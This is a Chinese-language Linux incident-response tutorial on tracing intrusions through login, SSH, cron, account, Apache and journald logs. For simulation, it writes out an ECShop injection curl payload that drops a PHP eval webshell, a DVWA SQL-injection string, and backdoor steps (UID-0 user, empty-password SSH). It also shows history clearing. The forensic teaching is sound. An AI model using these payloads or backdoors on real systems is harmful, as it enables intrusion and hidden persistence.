## 1 系统日志

### 1.1 查看当前登录的用户

w 是一个命令行工具，它可以展示当前登录用户信息，并且每个用户正在做什么。它同时展示以下信息：系统已经运行多长时间，当前时间，和系统负载。

```
[root@xuegod63 ~]# w
```

```
10:03:45 up 2 days, 13:16,  1 user,  load average: 0.01, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    223.80.224.191   09:58    1.00s  0.00s  0.00s w
```

| 操作        | 描述                         |
| --------- | -------------------------- |
| 10:03:45  | 系统当前时间                     |
| up 2 days | 系统上线时间                     |
| 1 user    | 登录用户数目                     |
| USER      | 登录用户名                      |
| TTY       | 登录用户使用的终端名称                |
| FROM      | 来自登录用户的主机名或者 IP            |
| LOGIN@    | 用户登录时间                     |
| IDLE      | 从用户上次和终端交互到现在的时间，即空闲时间     |
| JCPU      | 依附于 tty 的所有进程的使用时间         |
| PCPU      | 用户当前进程的使用时间。当前进程名称显示在 WHAT |
| WHAT      | 用户当前进程和选项、参数               |

### 1.2 查看所有用户最近一次登录

lastlog 命令 用于显示系统中所有用户最近一次登录信息

```
[root@xuegod63 ~]# lastlog
Username         Port     From             Latest
root             pts/0    223.80.224.191   Tue Aug  1 09:58:48 +0800 2023
bin                                        **Never logged in**
in**
www                                        **Never logged in**
mysql                                      **Never logged in**
ecshop           pts/12   123.113.246.37   Fri Aug 13 22:36:40 +0800 2021
dedecms          pts/16   183.11.73.143    Fri Aug 13 21:38:47 +0800 2021
discuzml         pts/8    112.42.32.244    Fri Aug 13 21:55:04 +0800 2021
discuzx          pts/8    112.42.32.244    Fri Aug 13 22:04:52 +0800 2021
```

`Never logged in` 是未登录的用户，一般为系统程序的用户

过滤掉关键词 `Never`

```
[root@xuegod63 ~]# lastlog | grep -v "Never"
```

```
Username         Port     From             Latest
root             pts/0    223.80.224.191   Tue Aug  1 09:58:48 +0800 2023
ecshop           pts/12   123.113.246.37   Fri Aug 13 22:36:40 +0800 2021
dedecms          pts/16   183.11.73.143    Fri Aug 13 21:38:47 +0800 2021
discuzml         pts/8    112.42.32.244    Fri Aug 13 21:55:04 +0800 2021
discuzx          pts/8    112.42.32.244    Fri Aug 13 22:04:52 +0800 2021
```

### 1.3 查看历史登录用户以及登录失败的用户

last 可以查看所有成功登录到系统的用户记录，lastb 查看登录失败的用户记录。

> 单独执行 last 指令时，它会读取位于/var/log/wtmp 的文件，并把该给文件的内容记录的登录系统的用户名单全部显示出来。
> 单独执行 lastb 指令，它会读取位于/var/log/btmp 的文件，并把该文件内容记录的登入系统失败的用户名单，全部显示出来。

查看所有成功登录到系统的用户记录

```
[root@xuegod63 ~]# last
```

查看登录失败的用户记录

```
[root@xuegod63 ~]# lastb
```

查看最近 5 个登录的用户

```
[root@xuegod63 ~]# last -n5
```

-a 参数把 ip 列放在最后一行

```
[root@xuegod63 ~]# last -a -n 5
```

-d ip 地址转换为主机名。该参数可以获取登录到系统的用户所使用的的主机名，如果目标使用的 vps 服务器绑定了域名，该参数有可能获取到目标域名。

```
[root@xuegod63 ~]# last -a -d
```

### 1.4 awk 命令

打印第一列和最后一列

```
[root@xuegod63 ~]# last -a |awk -F' ' '{ print $1 "\t" $NF}' |sort |uniq -c |sort -nr
```

| 操作    | 描述                               |
| ----- | -------------------------------- |
| -F' ' | 指定分隔符，每列之间使用空格分隔（默认空格，因此可以省略 -F） |
| print | 打印                               |
| $1    | 第一列                              |
| $NF   | 打印最后一列                           |
| "\t"  | 添加 tab 符分隔，一般是 4 个空格             |

对登录系统的用户和 ip 进行排序、去重、计数

```
[root@xuegod63 ~]# last -a |awk -F' ' '{ print $1 "\t" $NF}' |uniq -c |sort -nr
```

> 要先排序，否则去重不完整

| 操作       | 描述                       |
| -------- | ------------------------ |
| sort     | 会将文本进行排序，默认排序会把一样的行都排到一起 |
| uniq -c  | 计数                       |
| sort -nr | 排序                       |
| -nr      | 倒序                       |
| -n       | 正序                       |

lastb 查看所有登录记录包含失败

```
[root@xuegod63 ~]# lastb -a |awk -F' ' '{ print $1 "\t" $NF}' |uniq -c |sort -n
```

登录失败的请求更重要的是 ip 地址信息，只取 ip 地址进行统计。

```
[root@xuegod63 ~]# lastb -a |awk '{print $NF}' |uniq -c |sort -nr
```

## 2 SSH 日志

系统用户登录都会在/var/log/secure 日志文件中记录。但是这个日志文件会被系统自动分割。

```
[root@xuegod63 ~]# ll -ld /var/log/secure*
```

```
-rw-------  1 root root  64589 Aug  1 14:10 /var/log/secure
-rw-------. 1 root root      1 Aug 13  2021 /var/log/secure-20210813
-rw-------  1 root root 647326 Jul 29 21:16 /var/log/secure-20230729
-rw-------  1 root root  20435 Jul 30 03:07 /var/log/secure-2023073
```

> -d 参数表示只显示目录本身的信息,不显示其下的文件
> -l 参数显示长格式列表,包含文件属性、权限、所有者、大小、修改时间等信息

secure 默认会每天切割，配置文件在 `logroatate`

```
[root@xuegod63 ~]# cat /etc/cron.daily/logrotate
```

```
#!/bin/sh

/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit 0
```

通过通配符查看所有 secure 文件中登录失败的记录

```
[root@xuegod63 ~]# grep Failed /var/log/secure*
```

> 成功为 `Accepted`

取出第九列和第十一列

```
[root@xuegod63 ~]# grep Failed /var/log/secure* |awk -F' ' '{print $9 "\t" $11}'
```

过滤掉 `invalid` 或 `release` 用户名

```
[root@xuegod63 ~]# grep Failed /var/log/secure* |grep "invalid\|release"|awk '{print $9 "\t" $11}'
```

> `""` 中 `|` 表示或，需要在 `|` 前加上 `/` 转义

过滤用户名+登录失败的 IP

```
[root@xuegod63 ~]# grep Failed /var/log/secure* |grep -v "invalid"|grep -v "release"|awk -F' ' '{print $9 "\t" $11}' |sort |uniq -c | sort -nr
```

查看登录成功的 ip

```
[root@xuegod63 ~]# grep "Accepted " /var/log/secure* | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

### 2.1 历史命令日志

在根目录 `/` 下递归查找所有名为 `.bash_history` 的文件

```
[root@xuegod63 ~]# find / -name  .bash_history
```

查看历史命令

```
[root@xuegod63 ~]# history
```

自定义历史命令输出格式：添加一下配置到 /etc/profile

```
[root@xuegod63 ~]# vim /etc/profile
```

```
#记录登录者 IP 地址 who 命令可以查看当前登录信息
USER_IP=`who -u am i 2>/dev/null| awk '{print $NF}'|sed -e 's/[()]//g'`
#日志文件存放路径。
HISTDIR=/var/log/history
#设置日期
DT=`date +%Y-%m-%d`
#判断用户 IP 地址如果不存在或者为.则用户 IP 用本机主机名代替。
if [ -z $USER_IP ]
then
USER_IP=`hostname`
fi
pdf="."
if [[ ! $USER_IP == *${pdf}* ]]
then
USER_IP=`hostname`
fi
#判断日志文件路径是否存在，如果不存在则创建并添加权限。
if [ ! -d $HISTDIR ]
then
mkdir -p $HISTDIR
chmod 773 $HISTDIR
fi
#创建对应日期的日志文件
if [ ! -d $HISTDIR/${DT} ]
then
mkdir -p $HISTDIR/${DT}
chmod 773 $HISTDIR/${DT}
fi
#指定日志存放数量的总数
export HISTFILESIZE=10000
#配置 history 命令输出的总数
export HISTSIZE=10000
#配置文件具体时间
DT2=`date +%Y%m%d_%H:%M:%S`
#拼接文件名/var/log/history/日期 2021-09-08 /当前用户名@用户 ip_当前时间
#DT1 是日期 DT2 是准确到秒的准确时间。
export HISTFILE="$HISTDIR/${DT}/${LOGNAME}@${USER_IP}_$DT2"
#设置历史命令中的时间戳,history 命令有效，文件中显示时间戳。
export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S $"
```

重新加载配置文件

```
[root@xuegod63 ~]# source /etc/profile
```

查看历史命令，已经带了时间戳信息

```
[root@xuegod63 ~]# history 5
```

```
   68  2023-08-01 15:37:06 $cat /etc/.bash_history
   69  2023-08-01 15:39:06 $find -name ~/.bash_history
   70  2023-08-01 15:44:33 $history
   71  2023-08-01 15:56:50 $history5
   72  2023-08-01 15:57:05 $history 5
```

> 其它用户可以查看，危险
> 
> ```
> #指定日志存放数量的总数
> export HISTFILESIZE=10000
> #配置 history 命令输出的总数
> export HISTSIZE=10000
> #设置历史命令中的时间戳,history 命令有效，文件中显示时间戳。
> export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S $"
> ```
> 
> 只有这三行推荐设置

将本次登录的命令写入命令历史文件中，命令不是使用了就立即写入到文件中的，会先在缓存中，用户退出登录时会自动写入文件，-w 命令可以立即写入，-c 命令可以清除当前缓存中的命令。

清空历史命令

```
[root@CentOS-76 ~]# history -w
[root@CentOS-76 ~]# history -c
[root@CentOS-76 ~]# history -w
[root@CentOS-76 ~]# history -c
```

> history -w    将内存中的命令写入到文件
> 
>  history -c    将文件中的命令清空
> 
> 清空完重启 bsah

| 路径                  | 描述                        |
| ------------------- | ------------------------- |
| /var/log/message    | 包括整体系统信息                  |
| /var/log/auth.log   | 包含系统授权信息，包括用户登录和使用的权限机制等  |
| /var/log/userlog    | 记录所有等级用户信息的日志             |
| /var/log/cron       | 记录 crontab 命令是否被正确的执行     |
| /var/log/vsftpd.log | 记录 Linux FTP 日志           |
| /var/log/lastlog    | 记录登录的用户，可以使用命令 lastlog 查看 |
| /var/log/secure     | 记录大多数应用输入的账号与密码，登录成功与否    |
| /var/log/wtmp       | 记录登录系统成功的账户信息，等同于命令 las   |
| /var/log/btmp       | 记录登录系统失败的用户名单，等同于命令 lastb |
| /var/log/faillog    | 记录登录系统不成功的账号信息，一般会被黑客删除   |

### 2.2 计划任务日志

所有执行过的计划任务都会存在在 /var/log/cron 文件中

查看所有执行过的计划任务

```
[root@xuegod63 ~]# cat /var/log/cron* |awk -F':' '{print $NF}' |grep CMD |sort|uniq -c|sort -rn
```

查看所有用户的计划任务

```
[root@xuegod63 ~]# cat /etc/passwd | cut -f 1 -d : |xargs -i crontab -l -u {}
```

也可以直接查看/var/spool/cron/下的文件内容

> 所有用户级别的计划任务，都在这里有文件

```
[root@xuegod63 ~]# ls /var/spool/cron/
```

```
root
```

```
[root@xuegod63 ~]# cat /var/spool/cron/root
```

> 以上是用户级别的系统任务。系统级别的计划任务只能排查配置文件中的内容。

查看当前用户的计划任务

```
[root@xuegod63 ~]# crontab -l
```

查看 root 用户的计划任务

```
[root@xuegod63 ~]# crontab -l -u root
```

查看系统级别的计划任务文件名

```
[root@xuegod63 ~]# find /etc/cron* -type f
```

```
/etc/cron.d/0hourly
/etc/cron.d/sysstat
/etc/cron.daily/mlocate
/etc/cron.daily/logrotate
/etc/cron.daily/man-db.cron
/etc/cron.deny
/etc/cron.hourly/0anacron
/etc/crontab
```

> 可能会被注入后门

### 2.3 检查系统用户

Linux 系统用户主要存放于/etc/passwd 文件和/etc/shadow 文件中，还有一个组文件 /etc/group。

```
root:x:0:0:root:/root:/bin/bash
```

> （1）：用户名。
> （2）：密码（已经加密）
> （3）：UID（用户标识）,操作系统自己用的
> （4）：GID 组标识。
> （5）：用户全名或本地帐号
> （6）：开始目录
> （7）：登录使用的 Shell，就是对登录命令进行解析的工具

> 修改用户权限，可能被远程执行，存在后门

新增用户 hello

```
[root@CentOS-76 ~]# useradd hello
```

查看最新添加的用户

```
[root@CentOS-76 ~]# tail -n 1 /etc/passwd
```

```
hello:x:1001:1001::/home/hello:/bin/bash
```

修改用户权限

```
[root@CentOS-76 ~]# vim /etc/passwd
```

```
hello:x:0:1001::/home/hello:/bin/bash
```

查看用户身份，用户名还是 hello，用户身份已经识别为 root

```
[root@CentOS-76 ~]# id
```

```
uid=0(root) gid=1001(hello) 组=1001(hello)
```

> 此时 hello 用户拥有 root 用户所有权限。

排查所有存在 root 权限的用户

```
[root@xuegod63 ~]# awk -F':' '$3==0{print $1}'  /etc/passwd
```

设置 sshd 允许使用空口令账户登录 Linux 系统

```
[root@CentOS-76 ~]# vim /etc/ssh/sshd_config
```

```
 64 #PermitEmptyPasswords no
```

```
 64 PermitEmptyPasswords yes
```

重启配置

```
[root@CentOS-76 ~]# systemctl restart sshd.service
```

创建空口令用户

```
[root@CentOS-76 ~]# useradd test
```

设置密码

```
[root@CentOS-76 ~]# passwd test
```

删除 test 密码信息，使 test 成为空口令用户

```
[root@CentOS-76 ~]# vim /etc/shadow
```

```
test:$6$eWW/88sR$qiUz4RXPc2Ph9oNUP8f5FiiY45BKLWytZ.je7L/t1cqB3kHEkejCodbDxW0bkN10ylNIiaEotI6aYimKN4CUP.:19570:0:99999:7:::
```

```
test::19570:0:99999:7:::
```

测试空口令用户登录系统

```
[root@CentOS-76 ~]# ssh test@192.168.1.76
```

> 直接回车就可以登录成功，不用输入密码

### 2.4 中间件日志

Web 攻击的本地中间件日志，如 apache 日志 `/var/log/httpd/access_log`

1. 文件里找黑客上传的 webshell
2. 日志里找黑客 IP
3. 分析攻击路径
4. 溯源

> 若 webshell 在使用完后删除了，只能通过日志排查
> 
> 日志一般不记录 POST，但是 WAF 一般会记录

| Apache 日志字段说明 |
|:-------------:|

| 字段名称     | 描述                                                         |
| ------------ | ------------------------------------------------------------ |
| 远程主机     | IP 表明是谁访问了网站                                        |
| 空白(E-mail) | 为了避免用户的邮箱被垃圾邮件骚扰，第二项就用“-”取代了        |
| 空白(登录名) | 用于记录浏览者进行身份验证时提供的名字                       |
| 请求时间     | 用方括号包围，而且采用“公用日志格式”或者“标准英文格式”。 时间信息最后的 “+0800” 表示服务器所处时区位于 UTC 之后的 8 小时 |
| 方法         | 请求的方式：METHOD、GET、POST、HEAD 等                       |
| 资源         | 请求的文件                                                   |
| 协议         | 请求的协议：HTTP+版本号                                      |
| 状态码       | 请求的状态码                                                 |
| 发送的字节数 | 表示发送给客户端的总字节数。它告诉我们传输是否被打断（该数值是否和文件的大小相同） |
| Referer      | 从哪个页面链接过来的                                         |
| User-Agent   | 使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等信息。 |

列出日志文件

```
[root@CentOS-76 ~]# ls /var/log/httpd/
access_log  error_log
```

> 访问日志    `access_log` 
> 
> 错误日志    `error_log` 

查看访问日志

```
[root@CentOS-76 ~]# cat /var/log/httpd/access_log
```

```
222.162.139.114 - - [13/Aug/2021:22:07:23 +0800] "GET / HTTP/1.1" 200 1326
```

> 这些字段可以修改

对 IP 进行访问量的排序

```
[root@xuegod63 ~]# cat /www/wwwlogs/access_log |cut -f 1 -d ' '|sort|uniq -c|sort -nr|head -10
```

```
2417    222.162.139.114
249        47.101.44.122
243        42.91.4.89
125        59.14.228.19
118        120.244.60.57
72        59.55.162.174
62        178.115.244.26
56        123.113.73.154
51        123.113.251.30
50        123.180.245.154
```

> 1. cat /www/wwwlogs/access_log
>    读取访问日志文件access_log的内容。
> 2. cut -f 1 -d ' '
>    使用cut将日志内容切割,提取出以空格分隔的第一个字段,即访问者的IP地址。
> 3. sort
>    使用sort将切割得到的IP地址排序。
> 4. uniq -c
>    使用uniq统计每个IP的出现次数,-c表示显示次数。
> 5. sort -nr
>    使用sort将统计结果按访问次数降序排列。
> 6. head -10
>    取出排序后的前10行,即是访问次数最多的10个IP地址。

可以看到 `222.162.139.114` 这个 IP 访问次数很多，因此提取关于这个 IP 的所有信息

```
[root@xuegod63 ~]# cat /www/wwwlogs/access_log |grep "222.162.139.114"
```

```
222.162.139.114 - - [13/Aug/2021:22:12:26 +0800] "GET / HTTP/1.1" 200 1326
```

> 可以看到这个 IP 一直在访问 `/` 根目录

排查访问次数最多的路径，查看是否存在漏洞

```
[root@xuegod63 ~]# cat /www/wwwlogs/access_log |cut -f 7 -d ' '|sort|uniq -c|sort -nr|head -10
```

```
3354    /
243        /admin/privilege.php
31        /favicon.ico
21        http://47.241.121.65/
20        //
18        /animated_favicon.gif
16        /api/cron.php?t=1628861869
9        /uploads/a.php
9        /images/202108/thumb_img/140_thumb_G_1628861137422.jpg
9        /images/202108/thumb_img/139_thumb_G_1628861206122.jpg
```

> 可以看到 `/uploads/a.php` 经常被访问，可以排查这个路径

查看 `/uploads/a.php` 的访问请求

```
[root@xuegod63 ~]# cat /www/wwwlogs/access_log |grep "/uploads/a.php"
```

```
112.120.251.73 - - [13/Aug/2021:21:46:53 +0800] "POST /uploads/a.php HTTP/1.1" 200 84
112.120.251.73 - - [13/Aug/2021:21:46:57 +0800] "POST /uploads/a.php HTTP/1.1" 200 84
112.120.251.73 - - [13/Aug/2021:21:48:50 +0800] "GET /uploads/a.php HTTP/1.1" 200 -
112.120.251.73 - - [13/Aug/2021:21:49:14 +0800] "POST /uploads/a.php HTTP/1.1" 200 84
112.120.251.73 - - [13/Aug/2021:21:51:23 +0800] "POST /uploads/a.php HTTP/1.1" 404 36
112.120.251.73 - - [13/Aug/2021:21:49:03 +0800] "POST /uploads/a.php HTTP/1.1" 500 605
112.120.251.73 - - [13/Aug/2021:21:57:14 +0800] "POST /uploads/a.php HTTP/1.1" 404 267
112.120.251.73 - - [13/Aug/2021:21:57:16 +0800] "POST /uploads/a.php HTTP/1.1" 404 267
112.120.251.73 - - [13/Aug/2021:21:57:18 +0800] "POST /uploads/a.php HTTP/1.1" 404 267
```

查找这个文件，排查

```
[root@xuegod63 ~]# find /www/ -name a.php
```

在 DVWA 进行 SQL 注入

> http://192.168.1.76/DVWA/vulnerabilities/sqli/

```
-1'union select 1,2 -- +
```

排查志中和 SQL 注入有关的访问

```
[root@CentOS-76 ~]# cat /var/log/httpd/access_log |grep "union\|select\|if\|sleep"
```

```
192.168.1.76 - - [02/Aug/2023:09:36:49 +0800] "GET /DVWA/vulnerabilities/sqli/?id=-1%27union+select+1%2C2+--+%2B&Submit=Submit HTTP/1.1" 200 4357 "http://192.168.1.76/DVWA/vulnerabilities/sqli/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

> 这些记录证明收到了 SQL 注入的攻击

可以通过 IP 排查和这个 IP 有关的记录

```
[root@CentOS-76 ~]# cat /var/log/httpd/access_log |grep "192.168.1.76"
```

或者排查收到攻击之前的记录，逐步排查具体攻击时间

```
[root@CentOS-76 ~]# cat /var/log/httpd/access_log |grep "02/Aug/2023:09"
```

**通过时间检查站点被黑客修改过的文件**

模拟测试数据对 ecshop 站点写入 webshell

```
[root@xuegod63 ~]# curl http://ecshop.xueshenit.com/user.php -d"action=login&vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;" -H'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"'union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'
```

检查最近 1 天内被修改过的文件

```
[root@xuegod63 ~]# find /www/wwwroot/ecshop.xueshenit.com/ -name "*.php" -mtime -1
```

```
/www/wwwroot/ecshop.xueshenit.com/vulnspy.php
/www/wwwroot/ecshop.xueshenit.com/mobile/data/caches/caches/b/index_5F0C48C9.php
/www/wwwroot/ecshop.xueshenit.com/mobile/data/caches/query_caches/sqlcache_config_file_65128daae0a9e3ca67ca5c78972b8886.php
/www/wwwroot/ecshop.xueshenit.com/temp/caches/f/index_40F756F0.php
/www/wwwroot/ecshop.xueshenit.com/temp/query_caches/sqlcache_config_file_8f2b54dd1bf4a1a4cdad85d57e61738e.php
```

> 注：0 表示 24 小时内修改过的，1 表示昨天修改过的，2 表示前天修改过的。
> 
> 这是个单独的日期，想要指定 3 天之前到现在被修改过的文件则需要指定-3
> 
> 查看 30 天内修改过的文件示例：-mtime -30
> 
> `vulnspy.php` 为可疑文件，其它文件是临时文件
> 
> `-30` 是 30天内，`30` 是第 30 天

| 操作                 | 描述               |
| ------------------ | ---------------- |
| find -name "*.php" | 查找*.php 文件       |
| -mtime -1          | 查找最近 1 天内被修改过的文件 |

从以上文件用 grep 过滤可疑代码

```
[root@xuegod63 ~]# find /www/wwwroot/ecshop.xueshenit.com/ -name "*.php" -mtime -1 |xargs grep "eval\|system"
```

```
/www/wwwroot/ecshop.xueshenit.com/vulnspy.php:<?php eval($_REQUEST[vulnspy]);
```

以查看文件详细信息

```
[root@xuegod63 ~]# stat /www/wwwroot/ecshop.xueshenit.com/vulnspy.php
```

```
  File: ‘/www/wwwroot/ecshop.xueshenit.com/vulnspy.php’
  Size: 31            Blocks: 8          IO Block: 4096   regular file
Device: fd01h/64769d    Inode: 535740      Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1001/     www)   Gid: ( 1001/     www)
Access: 2023-08-01 21:09:33.363508954 +0800
Modify: 2023-08-01 21:09:23.579194041 +0800
Change: 2023-08-01 21:09:23.579194041 +08
```

> access time 访问时间 文件中的数据库最后被访问的时间
> modify time 修改时间 文件内容被修改的最后时间
> change time 变化时间 文件的元数据发生变化。比如权限，所有者等
> 
> 其中 `change time` 是唯一一个不可修改的时间，得到时间可以反查写入其它日志的这个时间的记录，一般精确到分即可，要允许有 1 分钟的误差

ls 命令默认查看的日期格式是英文的，可以修改为 2021-09-14 这样的格式

```
[root@xuegod63 ~]# echo "export TIME_STYLE='+%Y/%m/%d %H:%M:%S'" >> /etc/profile
```

```
[root@xuegod63 ~]# ll /www/wwwroot/ecshop.xueshenit.com/vulnspy.php
```

```
-rw-r--r-- 1 www www 31 2023/08/01 21:09:23 /www/wwwroot/ecshop.xueshenit.com/vulnspy.php
```

查看可疑文件

```
[root@xuegod63 ~]# cat /www/wwwroot/ecshop.xueshenit.com/vulnspy.php
```

```
<?php eval($_REQUEST[vulnspy]);You have new mail in /var/spool/mail/root
```

> 密码为 `vulnspy`

打印出时间

```
[root@xuegod63 ~]# ll /www/wwwroot/ecshop.xueshenit.com/vulnspy.php |cut -f 7 -d' '
```

```
21:09:23
```

在 apache 日志中查看这个时间的记录

```
[root@xuegod63 ~]# grep "21:09:23" /www/wwwlogs/access_log
```

```
123.113.73.154 - - [01/Aug/2023:21:09:23 +0800] "POST /user.php HTTP/1.1" 200 2
```

> 得到 IP 可以通过 IP 反查信息
> 
> https://ip.fm/

### 2.5 检查服务器已经建立的网络连接

如果黑客已经和服务器建立了连接，可通过查看当前服务器已经建立的链接来分析恶意 ip 和进程。

Linux 中查看网络连接常用 netstat。

| 操作  | 描述                        |
| --- | ------------------------- |
| -a  | 显示所有连线中的 Socket           |
| -n  | 直接使用 ip 地址，而不通过域名服务器      |
| -p  | 显示正在使用 Socket 的程序识别码和程序名称 |
| -t  | 显示 TCP 传输协议的连线状况          |
| -u  | 显示 UDP 传输协议的连线状况          |

查看服务器建立的链接

```
[root@xuegod63 ~]# netstat -anutp
```

```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      988/sshd            
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      1737/python
```

| 操作               | 描述           |
| ---------------- | ------------ |
| Proto            | 协议类型         |
| Recv-Q           | 接收消息队列       |
| Send-Q           | 发送消息队列       |
| Local Address    | 本地 ip 和端口    |
| Foreign Address  | 远程 ip 和端口    |
| State            | 网络连接状态       |
| PID/Program name | 进程 pid 和进程名称 |

| 操作          | 描述                                                                   |
| ----------- | -------------------------------------------------------------------- |
| LISTEN      | 本地服务侦听状态                                                             |
| ESTABLISHED | 已经建立链接双方正在通讯状态                                                       |
| CLOSE_WAIT  | 对方主动关闭连接或者网络异常导致连接中断，这时我方的状态会变成 CLOSE_WAIT 此时我方要调用 close()来使得连接正确关闭  |
| TIME_WAIT   | 我方主动调用 close()断开连接，收到对方确认后状态变为<br/>TIME_WAIT                         |
| SYN_SENT    | 半连接状态，原理同 SYN Flood 攻击，攻击者发送 SYN 后服务器端口，进入 SYN_SENT 状态等待用户返回 SYN+ACK |

过滤出 `LISTEN` 状态的连接

```
[root@xuegod63 ~]# netstat -anutp|grep LISTEN
```

> 护网要关闭不必要的连接

过滤出 `ESTABLISHED` 状态的连接

```
[root@xuegod63 ~]# netstat -anutp|grep ESTABLISHED
```

```
tcp        0      0 172.17.37.200:42470     100.103.2.231:80        ESTABLISHED 2608/AliYunDun      
tcp        0      0 172.17.37.200:22        183.46.78.7:7671        ESTABLISHED 13381/sshd: root@pt 
tcp        0     36 172.17.37.200:22        223.80.224.191:16260    ESTABLISHED 11660/sshd: root@pt 
tcp        0      0 172.17.37.200:8888      36.99.88.177:47182      ESTABLISHED 1737/python
```

## 3 通过 GScan 工具自动排查后门

GScan 是一款为安全应急响应提供便利的工具，自动化监测系统中常见位置

> https://github.com/grayddq/GScan

运行 GScan

```
[root@xuegod63 GScan-master]# python GScan.py --pro
```

> --help 查看帮助
> 
> --pro 快速检查并给出初步处理方案
> 
> --full 完整检查，比较耗时间

> 工具会自动分析系统日志以及系统中账户配置存在哪些安全问题并给出初步处理方案。这里工具仅排查系统相关，对中间件等应用服务日志没有进行分析处理。

## 4 systemd-journald 分析系统日志

systemd-journald 是一个收集并存储各类日志数据的系统服务。它创建并维护一个带有索引的、结构化的日志数据库，并可以收集来自各种不同渠道的日志。

systemd 是内核启动后的第一个用户进程，PID 为 1，是所有其它用户进程的父进程。所有服务的启动运行日志都可以记录到 systemd-journald 中，日志守护进程会以安全且不可伪造的方式自动收集每条日志的元数据。默认情况日志是存储在内存中的，系统重启后都会丢失。

> 黑客入侵系统后一般会将系统日志清空，以达到清理痕迹的作用，如果日志被黑客清空我们就无法通过日志来分析黑客入侵系统后都做了哪些事情，在很多情况下黑客在清理日志的时候都会忽略内存中的日志。

systemd-journald 持久化配置

> 由于日志默认存储在内存中，重启就会失效，如果想保存日志可以通过持久化配置将日志保存到本地。

查看默认配置文件

```
[root@xuegod63 ~]# vim /etc/systemd/journald.conf
```

```
[Journal]
#Storage=auto
#Compress=yes
#Seal=yes
#SplitMode=uid
#SyncIntervalSec=5m
#RateLimitInterval=30s
#RateLimitBurst=1000
#SystemMaxUse=
#SystemKeepFree=
#SystemMaxFileSize=
#RuntimeMaxUse=
#RuntimeKeepFree=
#RuntimeMaxFileSize=
#MaxRetentionSec=
#MaxFileSec=1month
#ForwardToSyslog=yes
#ForwardToKMsg=no
#ForwardToConsole=no
#ForwardToWall=yes
#TTYPath=/dev/console
#MaxLevelStore=debug
#MaxLevelSyslog=debug
#MaxLevelKMsg=notice
#MaxLevelConsole=info
#MaxLevelWall=emerg
#LineMax=48K
```

创建配置文件（journald 默认会加载 /etc/systemd/journald.conf.d 中的 .conf 文件）

```
[root@xuegod63 ~]# mkdir /etc/systemd/journald.conf.d
```

```
[root@xuegod63 ~]# vim /etc/systemd/journald.conf.d/99-prophet.conf
```

```
[Journal]
# 持久化保存到磁盘
Storage=persistent

# 压缩历史日志
Compress=yes

SyncIntervalSec=5m
RateLimitInterval=30s
RateLimitBurst=1000

# 最大占用空间 10G
SystemMaxUse=10G

# 单日志文件最大 200M
SystemMaxFileSize=200M

# 日志保存时间 2 周
MaxRetentionSec=2week

# 不将日志转发到 syslog
ForwardToSyslog=no
```

> Storage 参数详解：
> 
> "volatile" 表示仅保存在内存中,也就是仅保存在/run/log/journal 目录中(将会被自动按需创建)。
> 
> "persistent" 表示优先保存在磁盘上，也就优先保存在 /var/log/journal 目录中(将会被自动按需创建)，但若失败(例如在系统启动早期"/var"尚未挂载)，则转而保存在 /run/log/journal 目录中(将会被自动按需创建)。
> 
> "auto"(默认值) 与 "persistent" 类似，但不自动创建 /var/log/journal 目录，因此可以根据该目录的存在与否决定日志的保存位置。
> 
> "none" 表示不保存任何日志(直接丢弃所有收集到的日志)，但日志转发(见下文)不受影响。默认值是 "auto"

重启服务使配置文件生效

```
[root@xuegod63 ~]# systemctl restart systemd-journald.service
```

> 配置持久化后日志文件从临时文件目录/run/log/journal 保存至/var/log/journal 目录

查看 journal 文件

> /run/ 目录是从内存中映射到本地的，而不是磁盘数据

```
[root@xuegod63 ~]# ll /var/log/journal/
```

```
drwxr-sr-x+ 2 root systemd-journal 4096 2023/08/01 20:38:41 20201228113502924739250506992733
```

> 缺点：文件体积大，也容易被发现。

journalctl 查询日志

> 直接查询，默认查询规则是从旧到新排序

```
[root@xuegod63 ~]# journalctl
```

从新到旧排序使用-r 参数

```
[root@xuegod63 ~]# journalctl -r
```

查看指定服务日志

```
[root@xuegod63 ~]# journalctl -u sshd
```

实时查看最新日志

```
[root@xuegod63 ~]# journalctl -f
```

> Centos 默认不记录系统命令
> 
> Ctrl+c 关闭实时窗口，配置系统日志记录系统命令。

 配置文件中将 PROMPT_COMMAND 输出到系统日志中

```
[root@xuegod63 ~]# vim /etc/bashrc
```

```
export PROMPT_COMMAND='RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]:$(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" ) [$RETRN_VAL]"'
readonly PROMPT_COMMAND
```

> 构造消息日志过程：首先通过 history 1 取出当前执行的命来，$?获取该命令执行的返回值。通过logger -p local6.debug 自定义消息日志。
> 
> readonly PROMPT_COMMAND 设置为只读，防止被修改。

配置完成后重新打开终端窗口即可成效

> 该配置也可配置到/etc/profile 中，两个位置都可以。

指定查询时间

```
[root@xuegod63 ~]# journalctl --since "2021-11-05 00:00:00" --until "2021-11-05 17:00:00"
```

> --since 定义开始时间
> --until  定义结束时间
> 两个参数可以单独指定，仅指定开始日期获取开始日期后所有日志，仅指定结束日期获取结束日期前所有日志。
> 
> 日期格式必须是：YYYY-MM-DD HH:MM:SS

指定输出格式

